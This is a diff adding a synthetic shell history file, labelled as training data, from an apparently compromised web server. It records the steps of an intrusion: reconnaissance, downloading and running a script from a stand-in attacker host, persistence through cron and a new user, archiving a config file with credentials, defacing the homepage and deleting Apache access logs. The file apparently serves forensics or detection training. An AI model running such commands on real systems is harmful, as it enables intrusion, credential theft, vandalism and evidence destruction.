@@ -1,0 +1,17 @@
+# /root/.bash_history - synthetic artifact from compromised web01 (training data)
+# All domains use the reserved .example TLD; nothing here is real.
+id
+uname -a
+cat /etc/os-release
+wget http://staging.badactor.example/builder.sh -O /tmp/.cache/builder.sh
+chmod +x /tmp/.cache/builder.sh
+/tmp/.cache/builder.sh --install
+crontab -e
+cat /var/www/html/config.php
+tar czf /tmp/.cache/update.tar.gz /var/www/html/config.php /var/www/html/uploads/
+ls -la /backup/
+cp /var/www/html/index.html /tmp/.cache/index.html.bak
+echo hacked > /var/www/html/index.html
+useradd audituser
+find / -name "*.db" -o -name "*.sql" 2>/dev/null | head -20
+rm -rf /var/log/apache2/access.log
